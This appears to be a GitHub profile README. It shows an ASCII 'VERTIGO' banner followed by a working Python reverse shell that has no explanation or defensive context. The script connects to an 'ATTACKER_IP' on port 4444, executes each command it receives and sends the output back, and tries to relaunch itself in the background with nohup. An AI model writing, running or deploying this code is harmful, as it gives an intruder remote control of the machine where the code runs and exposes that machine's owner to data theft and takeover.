<div align="center">
  <img src="https://raw.githubusercontent.com/VertigoFromOuterSpace/VertigoFromOuterSpace/main/.assets/glitch_divider.svg?v=7" alt="Glitch Divider"/>
</div>

<div align="center">
  <pre>
echo  ╔═══════════════════════════════════════════════════════════════╗
echo  ║  ██╗   ██╗███████╗██████╗ ████████╗██╗ ██████╗  ██████╗       ║
echo  ║  ██║   ██║██╔════╝██╔══██╗╚══██╔══╝██║██╔════╝ ██╔═══██╗      ║
echo  ║  ██║   ██║█████╗  ██████╔╝   ██║   ██║██║  ███╗██║   ██║      ║
echo  ║  ╚██╗ ██╔╝██╔══╝  ██╔══██╗   ██║   ██║██║   ██║██║   ██║      ║
echo  ║   ╚████╔╝ ███████╗██║  ██║   ██║   ██║╚██████╔╝╚██████╔╝      ║
echo  ║    ╚═══╝  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝  ╚═════╝       ║
echo  ╚═══════════════════════════════════════════════════════════════╝
  </pre>
</div>

```diff

import socket
import subprocess
import os


ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to attacker
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            # Execute command and send output back
            output = subprocess.getoutput(command)
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    os.system("nohup python3 -c 'import os; os.system(\"python3 " + __file__ + "\")' &")
    connect()
